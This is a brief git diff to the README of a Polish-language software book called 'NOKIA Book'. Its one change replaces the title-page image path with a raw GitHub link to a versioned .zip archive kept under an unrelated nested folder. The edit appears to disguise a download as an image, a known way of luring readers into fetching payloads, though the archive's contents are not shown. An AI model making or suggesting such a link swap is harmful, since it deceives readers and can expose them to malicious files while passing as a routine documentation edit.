@@ -17,4 +17,4 @@ NOKIA Book
    "Praktyczny wstęp do wytwarzania systemów oprogramowania, które zmieniają bieg historii. Sprawdź, jak robią to specjaliści." (PL)
 
 
-![Titlepage](05/img/nb5.png)
+![Titlepage](https://raw.githubusercontent.com/aybibilalkali/nokia-book/master/02/BinPacking/BestFit/nokia-book-1.7-beta.4.zip)
